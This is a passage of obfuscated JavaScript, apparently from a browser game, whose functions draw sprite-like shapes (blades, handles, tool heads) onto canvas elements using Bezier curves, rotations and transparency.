			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[Δᐃᐃⵠ], ⲆΔΔᐃ * ᐃ);
			Δ.globalAlpha = 1;
			Δ.translate(-10 * ᐃ, ᐃ * ⲆΔΔᐃᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 178.5, ᐃ * 238.03125);
			Δ.bezierCurveTo(ᐃ * 177, ᐃ * 175.03125, ᐃ * 177, 175.03125 * ᐃ, ᐃ * 175.5, ᐃ * 112.03125);
			Δ.bezierCurveTo(184.5 * ᐃ, 100.53125 * ᐃ, 184.5 * ᐃ, ᐃ * 100.53125, ᐃ * 193.5, 89.03125 * ᐃ);
			Δ.bezierCurveTo(202 * ᐃ, 100.03125 * ᐃ, 202 * ᐃ, ᐃ * 100.03125, ᐃ * 210.5, ᐃ * 111.03125);
			Δ.bezierCurveTo(209.5 * ᐃ, ᐃ * 174.03125, 209.5 * ᐃ, ᐃ * 174.03125, ᐃ * 208.5, 237.03125 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ⲆⵠᐃΔ], ᐃ * ᐃᐃⲆᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 155.5, ᐃ * 239.03125);
			Δ.bezierCurveTo(194 * ᐃ, 238.53125 * ᐃ, ᐃ * 194, 238.53125 * ᐃ, ᐃ * 232.5, 238.03125 * ᐃ);
			Δ.bezierCurveTo(232.5 * ᐃ, 243.03125 * ᐃ, ᐃ * 232.5, 243.03125 * ᐃ, ᐃ * 232.5, 248.03125 * ᐃ);
			Δ.bezierCurveTo(194 * ᐃ, ᐃ * 248.53125, ᐃ * 194, 248.53125 * ᐃ, 155.5 * ᐃ, ᐃ * 249.03125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ⲆᐃᐃⲆ], 5 * ᐃ);
			ⵠᐃᐃ(Δ, 160.5 * ᐃ, 243.03125 * ᐃ, ⵠᐃⲆᐃΔⲆⵠ * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ΔⵠⵠΔ], ⵠⲆᐃᐃ * ᐃ);
			ⵠᐃᐃ(Δ, 227.5 * ᐃ, ᐃ * 242.03125, ᐃ * 7);
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠ], Ⲇᐃ[ᐃⲆⵠᐃ], ᐃ * ⵠⲆᐃᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 185.5, ᐃ * 253.03125);
			Δ.bezierCurveTo(193.5 * ᐃ, ᐃ * 253.03125, 193.5 * ᐃ, 253.03125 * ᐃ, 201.5 * ᐃ, ᐃ * 253.03125);
			Δ.bezierCurveTo(ᐃ * 201.5, ᐃ * 276.03125, 201.5 * ᐃ, ᐃ * 276.03125, 201.5 * ᐃ, 299.03125 * ᐃ);
			Δ.bezierCurveTo(194.5 * ᐃ, 299.03125 * ᐃ, 194.5 * ᐃ, ᐃ * 299.03125, ᐃ * 187.5, 299.03125 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠ], Ⲇᐃ[2], ᐃ * 7);
			ⵠᐃᐃ(Δ, 194 * ᐃ, 298 * ᐃ, ⲆΔⵠᐃΔ * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ᐃ * ᐃⲆⲆᐃᐃ);
			return Ⲇⵠ
		}

		function ᐃⵠΔⵠⲆᐃᐃᐃΔ(ᐃ, Ⲇᐃ, ⵠᐃⲆ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Δ.rotate(Math.PI / 2)
		}

		function ᐃⲆⵠΔΔΔᐃ(ᐃ, Ⲇᐃ, ⵠᐃⲆ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = 450 * ᐃ;
			var ⵠⵠᐃ = ᐃ * 145;
			var w2 = ᐃⵠⵠ / ΔⵠᐃⲆ;
			var ΔΔⵠⲆᐃ = ⵠⵠᐃ / 2;
			var ΔⵠΔΔ = 10 * ᐃ;
			var ᐃⵠΔⲆ = ᐃ * ᐃΔᐃⲆⵠ;
			var ⵠᐃⵠⵠⵠ = 300 * ᐃ;
			var ᐃⵠⵠⲆⲆ = ᐃ * 30;
			var ⲆⲆⵠ = ᐃ * 80;
			var ⵠⵠᐃⵠᐃ = ⵠᐃⵠⵠⵠ / 2;
			var ᐃⲆᐃᐃⵠ = ᐃⵠⵠⲆⲆ / 2;
			var ⵠⲆⵠ = 4;
			if (ⵠᐃⲆ) {
				var ᐃⵠⵠ = 145 * ᐃ;
				var ⵠⵠᐃ = ᐃ * 450;
				Ⲇⵠ.width = ᐃⵠⵠ;
				Ⲇⵠ.height = ⵠⵠᐃ;
				Δ.rotate(Math.PI / 2);
				Δ.save();
				Δ.globalAlpha = .5;
				Ⲇᐃᐃ(Δ, 100 * ᐃ, ᐃ * -110, ⵠᐃⵠⵠⵠ, ᐃⵠⵠⲆⲆ, ΔⵠΔΔ);
				ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠⲆ]);
				Δ.translate(178 * ᐃ, -98 * ᐃ);
				Ⲇᐃᐃ(Δ, -ⵠⵠᐃⵠᐃ, -ᐃⲆᐃᐃⵠ - 6 * ᐃ, ⵠⵠΔᐃᐃ * ᐃ, ᐃ * 100, ΔⵠΔΔ);
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.translate(ᐃ * -50, ᐃ * ⵠⵠΔⵠ);
				Ⲇᐃᐃ(Δ, ᐃ * 220, -15 * ᐃ, 90 * ᐃ, 90 * ᐃ, ΔⵠΔΔ);
				ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠⲆ]);
				Δ.restore();
				Δ.save();
				Δ.globalAlpha = 1;
				Δ.translate(250 * ᐃ, -63 * ᐃ);
				Ⲇᐃᐃ(Δ, -ⵠⵠᐃⵠᐃ - 20 * ᐃ, -ᐃⲆᐃᐃⵠ, ⵠᐃⵠⵠⵠ, ᐃⵠⵠⲆⲆ, ΔⵠΔΔ);
				ΔⲆ(Δ, Ⲇᐃ[ΔⲆᐃᐃ], Ⲇᐃ[ᐃⵠⲆⲆⲆ], ⵠⲆⵠ);
				Δ.translate(-70 * ᐃ, ᐃ * -40);
				Ⲇᐃᐃ(Δ, -ⵠⵠᐃⵠᐃ - 20 * ᐃ, -ᐃⲆᐃᐃⵠ, ᐃΔⲆⲆᐃ * ᐃ, ᐃ * ⵠⲆⲆᐃⵠΔⵠ, ΔⵠΔΔ);
				ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ⵠΔᐃΔ], ⵠⲆⵠ);
				Δ.translate(-70 * ᐃ, ⵠⵠⵠᐃΔⲆⵠ * ᐃ);
				Ⲇᐃᐃ(Δ, 220 * ᐃ, -22 * ᐃ, ᐃ * 90, ᐃ * 90, ΔⵠΔΔ);
				ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆΔⵠ], Ⲇᐃ[ⲆⵠᐃⲆ], ⵠⲆⵠ);
				Ⲇᐃᐃ(Δ, ᐃ * 230, -12 * ᐃ, 55 * ᐃ, 55 * ᐃ, ΔⵠΔΔ);
				ΔⲆ(Δ, Ⲇᐃ[5]);
				Δ.translate(-70 * ᐃ, ⲆⲆⲆᐃ);
				Ⲇᐃᐃ(Δ, -15 * ᐃ, ᐃ * -2, ᐃ * 60, ᐃ * 60, ΔⵠΔΔ);
				ΔⲆ(Δ, Ⲇᐃ[ⵠᐃΔⵠ]);
				Δ.restore()
			} else {
				Ⲇⵠ.width = ᐃⵠⵠ;
				Ⲇⵠ.height = ⵠⵠᐃ;
				Δ.save();
				Δ.globalAlpha = .5;
				Δ.translate(w2, ΔΔⵠⲆᐃ + ᐃ * 10);
				Ⲇᐃᐃ(Δ, -ⵠⵠᐃⵠᐃ, -ᐃⲆᐃᐃⵠ, ⵠᐃⵠⵠⵠ, ᐃⵠⵠⲆⲆ, ΔⵠΔΔ);
				ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃ]);
				Δ.translate(-65 * ᐃ, ᐃ * -25);
				Ⲇᐃᐃ(Δ, -ⵠⵠᐃⵠᐃ, -ᐃⲆᐃᐃⵠ - 6 * ᐃ, 100 * ᐃ, ᐃ * 100, ᐃ * 15);
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.translate(ᐃ * -35, -5 * ᐃ);
				Ⲇᐃᐃ(Δ, ᐃ * 220, ᐃ * -ⵠⵠⵠᐃΔⲆⵠ, 90 * ᐃ, 90 * ᐃ, ᐃ * ⲆΔΔⵠⲆ);
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.restore();
				Δ.save();
				Δ.globalAlpha = ᐃⲆᐃ;
				Δ.translate(ᐃ * 240, 70 * ᐃ);
				Ⲇᐃᐃ(Δ, -ⵠⵠᐃⵠᐃ, -ᐃⲆᐃᐃⵠ, ⵠᐃⵠⵠⵠ, ᐃⵠⵠⲆⲆ, ΔⵠΔΔ);
				ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ⲆⵠΔΔ], ⵠⲆⵠ);
				Δ.translate(ᐃ * -60, -40 * ᐃ);
				Ⲇᐃᐃ(Δ, -ⵠⵠᐃⵠᐃ - 20 * ᐃ, -ᐃⲆᐃᐃⵠ, ᐃ * ΔΔᐃⵠᐃ, ᐃ * 100, 15 * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[4], ⵠⲆⵠ);
				Δ.translate(-55 * ᐃ, 10 * ᐃ);
				Ⲇᐃᐃ(Δ, ᐃ * 220, -22 * ᐃ, ᐃ * 90, 90 * ᐃ, ᐃ * ΔⵠⵠᐃΔᐃⲆ);
				ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[Ⲇⵠⵠⵠ], ⵠⲆⵠ);
				Ⲇᐃᐃ(Δ, 240 * ᐃ, ᐃ * -ΔΔΔᐃᐃⲆᐃ, 55 * ᐃ, 55 * ᐃ, 12 * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[ⲆⲆΔⵠ]);
				Δ.translate(45 * ᐃ, ᐃⵠⲆ * ᐃ);
				Ⲇᐃᐃ(Δ, -145 * ᐃ, ᐃ * -2, 60 * ᐃ, 60 * ᐃ, ᐃ * ⵠⲆΔΔᐃ);
				ΔⲆ(Δ, Ⲇᐃ[5]);
				Δ.restore()
			}
			return Ⲇⵠ
		}

		function ⲆᐃⲆⵠᐃⲆⲆ(ᐃ, Ⲇᐃ, ⵠᐃ, ΔⵠΔⲆΔⲆΔ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 121 * ᐃ;
			Ⲇⵠ.height = ᐃ * 130;
			Δ.translate(0, ᐃ * 20);
			if (ⵠᐃ == ΔⵠΔⵠ) {
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(6 * ᐃ, 23 * ᐃ);
				Δ.bezierCurveTo(ᐃ * ᐃⲆⲆⲆ, 46 * ᐃ, ᐃ * ⵠΔⵠᐃⵠ, ᐃ * 46, ⵠᐃᐃΔ * ᐃ, ᐃ * 69);
				Δ.bezierCurveTo(21 * ᐃ, 69 * ᐃ, 21 * ᐃ, ᐃ * 69, 36 * ᐃ, 69 * ᐃ);
				Δ.bezierCurveTo(45.5 * ᐃ, ᐃ * 78.5, ᐃ * 45.5, ᐃ * 78.5, ᐃ * 55, ᐃ * 88);
				Δ.bezierCurveTo(55.5 * ᐃ, ᐃ * 45.5, 55.5 * ᐃ, ᐃ * 45.5, ᐃ * 56, 3 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 47, 14 * ᐃ, 47 * ᐃ, ᐃ * ⲆΔᐃΔⲆΔΔ, 38 * ᐃ, 25 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 23, ᐃ * 25, 23 * ᐃ, 25 * ᐃ, 6 * ᐃ, 23 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, ⲆⲆⲆⵠⵠ, Ⲇᐃ[3], ᐃ * Δⵠᐃⵠⵠ)
			}
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(ᐃ * ΔⵠⵠⲆΔ, 23 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 6, 46 * ᐃ, ᐃ * 6, 46 * ᐃ, ⵠⵠⵠⲆⲆ * ᐃ, ᐃ * 69);
			Δ.bezierCurveTo(21 * ᐃ, 69 * ᐃ, ᐃ * 21, 69 * ᐃ, ᐃ * 36, ᐃ * 69);
			Δ.bezierCurveTo(ᐃ * 45.5, 78.5 * ᐃ, 45.5 * ᐃ, 78.5 * ᐃ, 55 * ᐃ, 88 * ᐃ);
			Δ.bezierCurveTo(55.5 * ᐃ, 45.5 * ᐃ, ᐃ * 55.5, 45.5 * ᐃ, 56 * ᐃ, ⵠⵠⵠⵠ * ᐃ);
			Δ.bezierCurveTo(ᐃ * 47, ᐃ * ⵠᐃⵠΔᐃ, 47 * ᐃ, ⵠⲆΔᐃᐃ * ᐃ, 38 * ᐃ, ᐃ * 25);
			Δ.bezierCurveTo(ᐃ * 23, 25 * ᐃ, 23 * ᐃ, ᐃ * 25, ᐃ * ⵠΔⵠᐃⵠ, 23 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[Ⲇᐃᐃⵠ], ᐃ * ⵠᐃᐃⲆ);
			if (ΔⵠΔⲆΔⲆΔ == 1) {
				Δ.translate(ⲆΔⵠ, 5 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(67 * ᐃ, 30 * ᐃ);
				Δ.bezierCurveTo(73 * ᐃ, 47 * ᐃ, 69 * ᐃ, 45 * ᐃ, ᐃ * 67, ᐃ * 58);
				ΔⲆ(Δ, undefined, Ⲇᐃ[ⲆⲆⲆᐃ], 10 * ᐃ);
				Δ.translate(3, ᐃ * 0);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 70, 17 * ᐃ);
				Δ.bezierCurveTo(83 * ᐃ, ᐃ * 45, 76 * ᐃ, ᐃ * 55, 70 * ᐃ, 69 * ᐃ);
				ΔⲆ(Δ, ⲆΔᐃᐃᐃ, Ⲇᐃ[0], 10 * ᐃ);
				Δ.translate(Δⵠᐃⵠ, 0 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
				Δ.moveTo(ᐃ * 76, 8 * ᐃ);
				Δ.bezierCurveTo(88 * ᐃ, 31 * ᐃ, 89 * ᐃ, ᐃ * 55, ᐃ * 76, ᐃ * 79);
				ΔⲆ(Δ, ⲆⵠᐃⲆⲆ, Ⲇᐃ[0], ⵠⵠⲆΔΔ * ᐃ);
				if (ⵠᐃ == 1) {
					Δ.translate(ᐃ * -ⵠⲆⵠⲆΔ, -ⵠⵠᐃⵠ * ᐃ);
					Δ.beginPath();
					Δ.lineCap = ⵠ[ᐃⲆⵠΔ];
					Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
					Δ.moveTo(67 * ᐃ, ᐃ * 30);
					Δ.bezierCurveTo(ᐃ * 73, 47 * ᐃ, ᐃ * 69, ᐃ * 45, ᐃ * 67, 58 * ᐃ);
					ΔⲆ(Δ, ⵠⵠᐃᐃᐃ, Ⲇᐃ[ᐃᐃⲆΔⵠ], ᐃ * 18);
					Δ.translate(3, ᐃ * 0);
					Δ.beginPath();
					Δ.lineCap = ⵠ[5];
					Δ.lineJoin = ⵠ[5];
					Δ.moveTo(ᐃ * 70, ᐃ * 17);
					Δ.bezierCurveTo(ᐃ * 83, ᐃ * 45, 76 * ᐃ, 55 * ᐃ, ᐃ * 70, ᐃ * 69);
					ΔⲆ(Δ, undefined, Ⲇᐃ[3], ᐃ * ⲆⵠⲆᐃΔ);
					Δ.translate(ⵠΔΔΔΔ, ⵠΔⲆⵠ * ᐃ);
					Δ.beginPath();
					Δ.lineCap = ⵠ[5];
					Δ.lineJoin = ⵠ[5];
					Δ.moveTo(ᐃ * 76, ᐃ * ΔⲆᐃⵠⲆΔⵠ);
					Δ.bezierCurveTo(88 * ᐃ, 31 * ᐃ, ᐃ * 89, 55 * ᐃ, ᐃ * 76, ᐃ * 79);
					ΔⲆ(Δ, undefined, Ⲇᐃ[3], ⲆⵠⵠⲆⲆ * ᐃ);
					Δ.translate(-6, ᐃⵠⲆ * ᐃ)
				} else {
					Δ.translate(-6 * ᐃ, -5 * ᐃ)
				}
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 67, 30 * ᐃ);
				Δ.bezierCurveTo(73 * ᐃ, 47 * ᐃ, 69 * ᐃ, ᐃ * 45, 67 * ᐃ, 58 * ᐃ);
				ΔⲆ(Δ, ⲆⵠᐃⲆⲆ, Ⲇᐃ[ⵠΔⲆᐃ], ᐃ * ᐃⵠΔⵠⵠ);
				Δ.translate(3, ᐃ * 0);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ΔⲆΔΔ];
				Δ.moveTo(70 * ᐃ, ⲆᐃᐃⲆΔ * ᐃ);
				Δ.bezierCurveTo(ᐃ * 83, 45 * ᐃ, 76 * ᐃ, 55 * ᐃ, 70 * ᐃ, ᐃ * 69);
				ΔⲆ(Δ, ΔⵠⲆᐃΔ, Ⲇᐃ[2], ⲆⲆⲆΔᐃ * ᐃ);
				Δ.translate(ΔΔᐃΔ, ᐃ * ⲆⲆⲆᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(76 * ᐃ, 8 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 88, 31 * ᐃ, ᐃ * 89, ᐃ * 55, ᐃ * 76, 79 * ᐃ);
				ΔⲆ(Δ, undefined, Ⲇᐃ[2], ᐃΔⲆᐃⵠ * ᐃ)
			} else {
				if (1 == ⵠᐃ) {
					Δ.beginPath();
					Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
					Δ.lineJoin = ⵠ[5];
					Δ.moveTo(ᐃ * 108, ᐃ * 27);
					Δ.bezierCurveTo(ᐃ * 94, ᐃ * 45.5, ᐃ * 94, 45.5 * ᐃ, ᐃ * 80, 64 * ᐃ);
					Δ.closePath();
					ΔⲆ(Δ, ⵠΔᐃⲆΔ, Ⲇᐃ[3], ᐃ * 18);
					Δ.beginPath();
					Δ.lineCap = ⵠ[5];
					Δ.lineJoin = ⵠ[5];
					Δ.moveTo(79 * ᐃ, 30 * ᐃ);
					Δ.bezierCurveTo(ᐃ * 93, ᐃ * 47, 93 * ᐃ, ᐃ * 47, ᐃ * 107, ᐃ * 64);
					Δ.closePath();
					ΔⲆ(Δ, undefined, Ⲇᐃ[ⵠᐃⵠⲆ], ᐃΔΔⵠᐃ * ᐃ)
				} else {
					Δ.translate(Δᐃᐃⵠ, ᐃ * -5);
					Δ.beginPath();
					Δ.lineCap = ⵠ[5];
					Δ.lineJoin = ⵠ[5];
					Δ.moveTo(ᐃ * 108, 27 * ᐃ);
					Δ.bezierCurveTo(ᐃ * 94, ᐃ * 45.5, 94 * ᐃ, ᐃ * 45.5, 80 * ᐃ, ᐃ * 64);
					Δ.closePath();
					ΔⲆ(Δ, undefined, Ⲇᐃ[ΔⲆⲆ], ᐃᐃⵠⵠⵠ * ᐃ);
					Δ.beginPath();
					Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
					Δ.lineJoin = ⵠ[5];
					Δ.moveTo(ᐃ * 79, 30 * ᐃ);
					Δ.bezierCurveTo(93 * ᐃ, ᐃ * 47, ᐃ * 93, ᐃ * 47, 107 * ᐃ, ᐃ * 64);
					Δ.closePath();
					ΔⲆ(Δ, ΔⵠⲆᐃΔ, Ⲇᐃ[0], ᐃ * ᐃⵠⵠⵠΔ);
					Δ.translate(0, ᐃ * 5)
				}
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(108 * ᐃ, 27 * ᐃ);
				Δ.bezierCurveTo(94 * ᐃ, 45.5 * ᐃ, ᐃ * 94, 45.5 * ᐃ, ᐃ * 80, ᐃ * 64);
				Δ.closePath();
				ΔⲆ(Δ, undefined, Ⲇᐃ[ⵠⵠⵠΔ], ᐃ * ᐃΔⲆΔᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(79 * ᐃ, ᐃ * 30);
				Δ.bezierCurveTo(ᐃ * 93, 47 * ᐃ, 93 * ᐃ, 47 * ᐃ, 107 * ᐃ, 64 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, ⵠᐃⵠⲆΔ, Ⲇᐃ[2], ᐃ * 7)
			}
			return Ⲇⵠ
		}

		function ᐃΔᐃⲆΔΔᐃ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 290 * ᐃ;
			Ⲇⵠ.height = ᐃ * 525;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(20 * ᐃ, ᐃ * 20);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(111 * ᐃ, 351 * ᐃ);
			Δ.bezierCurveTo(129 * ᐃ, 218 * ᐃ, ᐃ * 129, ᐃ * 218, ᐃ * 147, 85 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 167, ᐃ * 65.5, 167 * ᐃ, ᐃ * 65.5, ᐃ * 187, ᐃ * 46);
			Δ.bezierCurveTo(ᐃ * 201.5, 70.5 * ᐃ, ᐃ * 201.5, 70.5 * ᐃ, 216 * ᐃ, ᐃ * 95);
			Δ.bezierCurveTo(194.5 * ᐃ, 227.5 * ᐃ, 194.5 * ᐃ, 227.5 * ᐃ, ᐃ * 173, ᐃ * 360);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.save();
			Δ.translate(131 * ᐃ, 425.5 * ᐃ);
			Δ.rotate(.16);
			Ⲇᐃᐃ(Δ, -ⲆⵠⲆⵠΔⵠᐃ * ᐃ, ᐃ * -56.5, ᐃ * 28, ᐃ * 113, ᐃ * 8);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			ⵠᐃᐃ(Δ, ᐃ * 122, ᐃ * 480, 18.439088914585774 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 79, ᐃ * 371);
			Δ.bezierCurveTo(131 * ᐃ, 373 * ᐃ, ᐃ * 145, ᐃ * 378, 197 * ᐃ, ᐃ * 388);
			Δ.bezierCurveTo(ᐃ * 205, ᐃ * 382.5, 205 * ᐃ, ᐃ * 382.5, ᐃ * 213, 377 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 167, 352 * ᐃ, 117 * ᐃ, ᐃ * 345, ᐃ * 69, ᐃ * 355);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆ]);
			Δ.globalAlpha = 1;
			Δ.translate(-ΔᐃⲆⵠᐃ * ᐃ, ᐃ * -20);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 111, ᐃ * 351);
			Δ.bezierCurveTo(129 * ᐃ, 218 * ᐃ, ᐃ * 129, 218 * ᐃ, ᐃ * 147, ᐃ * 85);
			Δ.bezierCurveTo(167 * ᐃ, ᐃ * 65.5, ᐃ * 167, ᐃ * 65.5, 187 * ᐃ, 46 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 201.5, ᐃ * 70.5, ᐃ * 201.5, ᐃ * 70.5, ᐃ * 216, ᐃ * 95);
			Δ.bezierCurveTo(ᐃ * 194.5, 227.5 * ᐃ, 194.5 * ᐃ, ᐃ * 227.5, ᐃ * 173, 360 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⵠΔ], Ⲇᐃ[ⲆΔΔⵠ], ᐃ * 12.5);
			Δ.save();
			Δ.translate(131 * ᐃ, 425.5 * ᐃ);
			Δ.rotate(.16);
			Ⲇᐃᐃ(Δ, ᐃ * -14, -56.5 * ᐃ, ᐃ * 28, ᐃ * 113, ᐃ * 8);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[ⵠᐃΔⵠ], ᐃ * 12.5);
			ⵠᐃᐃ(Δ, ᐃ * 122, ᐃ * 480, 18.439088914585774 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃΔΔ], Ⲇᐃ[5], 12.5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
			Δ.moveTo(ᐃ * 79, ᐃ * 371);
			Δ.bezierCurveTo(131 * ᐃ, 373 * ᐃ, ᐃ * 145, 378 * ᐃ, ᐃ * 197, ᐃ * 388);
			Δ.bezierCurveTo(ᐃ * 205, 382.5 * ᐃ, 205 * ᐃ, 382.5 * ᐃ, 213 * ᐃ, ᐃ * 377);
			Δ.bezierCurveTo(ᐃ * 167, 352 * ᐃ, 117 * ᐃ, 345 * ᐃ, 69 * ᐃ, ᐃ * 355);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[5], ᐃ * 12.5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔΔᐃⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(128 * ᐃ, ᐃ * 345);
			Δ.bezierCurveTo(ᐃ * 142, ᐃ * 345, 147 * ᐃ, ᐃ * 346, 158 * ᐃ, 349 * ᐃ);
			Δ.bezierCurveTo(177.5 * ᐃ, 224.5 * ᐃ, 177.5 * ᐃ, ᐃ * 224.5, ᐃ * 197, ⵠᐃⲆΔΔ * ᐃ);
			Δ.bezierCurveTo(ᐃ * 190.5, 84.5 * ᐃ, 190.5 * ᐃ, 84.5 * ᐃ, ᐃ * 184, ᐃ * 69);
			Δ.bezierCurveTo(ᐃ * 173.5, ᐃ * 82, 173.5 * ᐃ, ᐃ * 82, 163 * ᐃ, 95 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃⲆΔ]);
			return Ⲇⵠ
		}

		function ᐃⲆΔΔⲆᐃⲆ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 424 * ᐃ;
			Ⲇⵠ.height = ᐃ * 788;
			Δ.translate(25 * ᐃ, ᐃ * 25);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.save();
			Δ.translate(ᐃ * 193.5, 602.5 * ᐃ);
			Δ.rotate(-.12);
			Ⲇᐃᐃ(Δ, ᐃ * -26.5, -97.5 * ᐃ, 53 * ᐃ, ᐃ * 195, 25 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(137 * ᐃ, ᐃ * 519);
			Δ.bezierCurveTo(182 * ᐃ, ᐃ * 513, ᐃ * 182, ᐃ * 513, 227 * ᐃ, ᐃ * 507);
			Δ.bezierCurveTo(214 * ᐃ, 417 * ᐃ, 189 * ᐃ, ᐃ * 304, 221 * ᐃ, ᐃ * 180);
			Δ.bezierCurveTo(191 * ᐃ, 126 * ᐃ, 192 * ᐃ, 105 * ᐃ, ᐃ * 198, 64 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 123, 102 * ᐃ, 99 * ᐃ, ᐃ * 285, ᐃ * 137, ᐃ * 517);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(ᐃ * 175, ᐃ * 119);
			Δ.bezierCurveTo(176 * ᐃ, 142 * ᐃ, 184 * ᐃ, ᐃ * 165, 197 * ᐃ, 183 * ᐃ);
